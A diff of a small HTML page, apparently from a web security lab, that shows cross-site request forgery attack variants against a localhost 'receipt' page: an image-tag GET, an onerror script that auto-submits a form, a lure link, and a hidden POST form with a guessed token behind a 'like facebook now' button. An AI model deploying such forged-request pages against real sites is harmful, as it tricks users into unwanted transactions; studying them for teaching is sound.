@@ -6,7 +6,7 @@
 <body>
 	<p>hello my friend</p>
 	<!-- Automatic GET via IMG tag -->
-	<!-- 
+	<!--
 	<img src="http://localhost/websec/receipt_unsafe.php">
 	-->
 
@@ -14,30 +14,30 @@
 	<!--
 	<script src="jquery-2.1.4.min.js"/>
 	<img src="/x" onerror="$('#scam_form').submit()">
- 	-->		
+ 	-->
 
  	<!-- Click link to navigate (stupid but common) -->
-	<!-- 	
+	<!--
 	<a href="http://localhost/websec/receipt_unsafe.php">
 		<img src="csrf_attack_img.jpg"/>
 	</a>
  	-->
 
  	<!-- User-submitted POST form -->
-	<form 
-		form-name="checkout_form" 
-		method="POST" 
+	<form
+		form-name="checkout_form"
+		method="POST"
 		action="http://localhost/websec/receipt.php"
 		id="scam_form"
 	>
-		<input 
-			type="hidden" 
-			name="csrf_token" 
+		<input
+			type="hidden"
+			name="csrf_token"
 			value="attacker has no idea"
 		>
-		
-		<input 
-			type="submit" 
+
+		<input
+			type="submit"
 			value="like facebook now"
 		>
 	</form>
